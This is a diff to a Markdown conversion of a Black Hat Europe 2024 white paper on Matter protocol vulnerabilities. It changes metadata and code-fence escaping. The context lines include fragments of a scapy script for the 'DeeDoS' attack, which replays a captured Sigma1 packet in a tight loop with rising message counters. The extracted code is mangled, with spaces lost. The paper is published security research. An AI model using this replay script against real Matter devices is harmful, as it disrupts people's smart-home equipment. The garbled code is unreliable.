@@ -8,19 +8,24 @@ year: 2024
 source_pdf: "BlackHat_Europe_2024_slides/Bela Genge & Ioan Padurean_Breaking Matter Vulnerabilities in the Matter Protocol_wp.pdf"
 pages: 21
 sha256: "79c6988b7fd26b9b4bb66311e25efc56eb0092a343a43a3b7004f72decacc977"
-text_chars: 47449
+text_chars: 47457
 ocr_pages: 0
 has_ocr: false
 redacted_secrets: 0
+ocr_confidence: null
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2"
-converted_at: "2026-08-12T00:00:39Z"
+converted_at: "2026-08-12T04:54:31Z"
 ---
 # Breaking Matter Vulnerabilities in the Matter Protocol
 
 **Speakers:** Bela Genge, Ioan Padurean  
 **Conference:** Black Hat Europe 2024  
 **Source:** `BlackHat_Europe_2024_slides/Bela Genge & Ioan Padurean_Breaking Matter Vulnerabilities in the Matter Protocol_wp.pdf` (21 pages)
+
 
 ## Slide 1
 
@@ -288,12 +293,12 @@ As mentioned earlier, CASE Sigma1 packets are not encrypted. Therefore, a first 
 
 The next step in the DeeDoS attack is to replay the captured Sigma1 packet, while increasing the Message Counter in the Matter packet headers. For this purpose, the Python script below can be used. Note that global variables need to be initialized in order for the script to run properly. For simplicity, these have been omitted from the given example.
 
-```
+\```
 fromscapy.allimport*
 importtime
-```
+\```
 
-```
+\```
 #ReplacethefollowinglinewiththecapturedMatterSigma1packetbytes
 #(Matterheaders+payload ,maybeexportedfromWireshark)
 MATTER_PACKET=bytearray ()
@@ -324,24 +329,24 @@ DNS(matter_payload)
 )
 sendp(pkt.build (),iface=’wlp3s0 ’,verbose=0)
 print("Matterpacketwasinjected")
-```
+\```
 
 10
 
 ## Slide 12
 
-```
+\```
 message_counter+=1
-```
+\```
 
-```
+\```
 while(True):
 try:
 inject_matter_packet ()
 exceptExceptionasex:
 print("Exception:",str(ex))
 time.sleep(0.01)
-```
+\```
 
 #### **4.1.3 Discussion and results**
 
